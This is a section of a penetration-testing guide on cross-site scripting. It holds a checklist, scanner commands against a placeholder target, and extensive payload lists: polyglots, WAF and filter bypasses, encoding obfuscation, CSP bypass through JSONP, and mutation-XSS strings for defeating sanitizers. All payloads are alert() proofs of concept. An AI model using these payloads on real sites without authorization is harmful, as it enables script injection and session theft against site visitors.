# 4. Cross-Site Scripting (XSS)

**What it is:** attacker-controlled input gets rendered/executed as HTML/JS. On a "static" site, look at: search box, contact form, comment widget, newsletter signup, URL params reflected in page (e.g. `?name=` shown on page), 404 page echoing the requested path, client-side JS that reads `location.hash`/`location.search` and writes to DOM (DOM XSS).

### Test checklist
- [ ] Reflected: any URL parameter echoed back unescaped
- [ ] DOM-based: JS source uses `innerHTML`, `document.write`, `eval`, `location.hash` without sanitization
- [ ] Stored: contact form / comment / guestbook output shown to other visitors or in an admin panel
- [ ] 404/error page reflecting the requested URL/path
- [ ] File upload with SVG (SVG can contain `<script>`) if any upload exists

### Payloads to try (escalate from simple to polyglot)
```
"><script>alert(1)</script>
'"><img src=x onerror=alert(1)>
<svg onload=alert(1)>
 javascript:alert(1)                     # in href/src context
"><svg/onload=alert(document.domain)>
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e   # polyglot
```

### Linux (Kali)
```
# Automated DOM XSS discovery via source/sink analysis
dalfox url https://target.com/?q=FUZZ
dalfox file urls.txt                      # bulk test many parameters
xsstrike -u "https://target.com/?q=test"
# find parameters first:
paramspider -d target.com
arjun -u https://target.com/page
# grep JS for dangerous sinks:
for f in $(cat js_files.txt); do curl -s $f; done | grep -E "innerHTML|document\.write|eval\(|location\.hash"
```

### Windows
```
# dalfox, xsstrike are Go/Python \u2014 run natively:
dalfox.exe url https://target.com/?q=FUZZ
python xsstrike.py -u "https://target.com/?q=test"
# Manual param fuzz in PowerShell:
$payload = "<script>alert(1)</script>"
Invoke-WebRequest -Uri "https://target.com/search?q=$([uri]::EscapeDataString($payload))" -UseBasicParsing | Select -Expand Content | Select-String "<script>alert"
```
Use Burp Suite / OWASP ZAP (same on both OS) for systematic parameter fuzzing with their built-in XSS payload lists \u2014 far faster than manual testing for every field.

**Impact framing:** stored XSS reachable by other visitors = high; reflected/DOM XSS needing a crafted link = medium-high depending on what cookies/tokens exist to steal.

## Advanced / WAF Bypass Techniques

Basic `<script>alert(1)</script>` gets blocked by every WAF on day one. Real testing means systematically discovering *which* tags/attributes/events the filter actually allows, then building a payload from what's left.

### Methodology: brute-force the allow-list instead of guessing payloads
1. Get PortSwigger's XSS cheat sheet tag list and attribute list (portswigger.net/web-security/cross-site-scripting/cheat-sheet \u2014 has a "copy tags to clipboard" / "copy events to clipboard" feature built for exactly this).
2. Load the tag list into Burp Intruder as a payload set against the injection point; most will 400/be stripped, a few will return 200 \u2014 those are your allowed tags.
3. Repeat with the attribute/event list against the one tag that got through.
4. Build the final payload from the one surviving tag + one surviving event.
```
# Kali equivalent without Burp (slower, but works for a quick manual check)
for tag in $(cat xss_tags.txt); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/search?q=$tag")
  echo "$tag -> $code"
done
```

### Payloads that routinely survive filters (because they don't look like "classic" XSS)
```
<body onresize=alert(1)>                                    # needs window resize; trigger via <svg onload> wrapping iframe, or just rely on devtools resize during testing
<x style="transition:transform 10s" ontransitioncancel=alert(1)>   # fires via CSS transition cancellation, no user action needed
<details open ontoggle=alert(1)>
<select autofocus onfocus=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<xss onafterscriptexecute=alert(1)><script>1</script>       # fires when ANY script on the page finishes
<marquee onstart=alert(1)>
<input autofocus onfocus=alert(1)>
<a onbeforeactivate=alert(1) id=x tabindex=1></a>            # needs #x in the URL fragment
```

### Encoding/obfuscation to defeat signature-based filters
```
<svg/onload=alert(1)>                      # slash instead of space
<svg onload=\u0061lert(1)>                  # unicode-escaped JS
<svg onload=alert&#40;1&#41;>                # HTML entity-encoded parens
<img src=x onerror="&#97;lert(1)">          # entity-encoded function name
jaVasCript:alert(1)                          # mixed-case protocol handler bypasses case-sensitive blocklists
<script>eval(atob('YWxlcnQoMSk='))</script>  # base64-wrapped payload, bypasses plain-text keyword matching
```

### Framework-specific DOM XSS sinks worth grepping for (React/Vue/Angular apps that are mostly static)
```
# React: dangerouslySetInnerHTML is the giveaway
grep -r "dangerouslySetInnerHTML" js_files.txt
# Angular: bypassSecurityTrust* functions disable sanitization
grep -rE "bypassSecurityTrust(Html|Script|Url)" js_files.txt
# Vue: v-html directive
grep -r "v-html" js_files.txt
```

### CSP bypass angles worth checking before writing off XSS as "blocked by CSP"
```
# JSONP endpoints on an allowed script-src host let you smuggle arbitrary JS execution
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>
# AngularJS sandbox escape if CSP allows it and Angular is loaded on the page
# Check for 'unsafe-inline', missing nonce rotation, or overly broad script-src (e.g. https: with no host restriction)
curl -I https://target.com | grep -i content-security-policy
```

### Mutation XSS (mXSS) \u2014 bypasses sanitizers that only check input, not what the DOM parser produces
```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```
These exploit the gap between what a sanitizer parses and what the browser's actual HTML parser re-serializes \u2014 effective against DOMPurify-style client-side sanitization bypasses specifically.

**Resources:** PortSwigger's XSS cheat sheet (the canonical bypass database, updated regularly) and "One XSS cheatsheet to rule them all" research post, OWASP XSS Filter Evasion Cheat Sheet, PayloadsAllTheThings XSS Injection section, swisskyrepo's framework-specific payload collections.
